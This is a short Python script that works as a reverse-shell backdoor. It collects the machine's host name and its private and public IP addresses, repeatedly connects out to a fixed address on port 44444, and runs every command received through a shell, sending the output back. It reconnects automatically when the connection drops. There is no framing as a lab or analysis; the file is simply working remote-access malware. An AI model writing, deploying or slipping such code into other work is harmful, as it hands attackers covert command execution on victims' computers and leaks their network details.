import socket
import os
import subprocess
import sys
import time

import requests


def conn(host, port):
    while 1:
        try:
            sock.connect((host, int(port)))
            break
        except OSError:
            time.sleep(10)


def oprate():
    sock.send(host_info)
    while 1:
        try:
            command = sock.recv(65536).decode('utf-8')
            print(command)
            if command == "!ch":
                sock.send(host_info)
                continue
            result = subprocess.Popen(command,
                                      shell=True,
                                      stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE)
            m_stdout, m_stderr = result.communicate()
            sock.send(m_stdout.decode(sys.getfilesystemencoding()).encode('utf-8'))
        except ConnectionResetError:
            sock.close()
            run()
        except ConnectionAbortedError:
            sock.close()
            exit(0)


def run():
    global sock, host_info
    sock = socket.socket()
    host_name = socket.gethostname()
    ip_pri = socket.gethostbyname(host_name)
    ip_pub = requests.get("http://www.httpbin.org/ip").json()["origin"]
    host_info = "客户端[{0}]====[公网ip:{1}][内网ip:{2}]已经连接".format(host_name, ip_pub, ip_pri).encode()
    host = "192.168.1.77"
    port = "44444"
    conn(host, port)
    oprate()


def check_connect():
    sock_check = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_check.bind(("0.0.0.0", 48888))
    sock_check.listen(4888)


run()
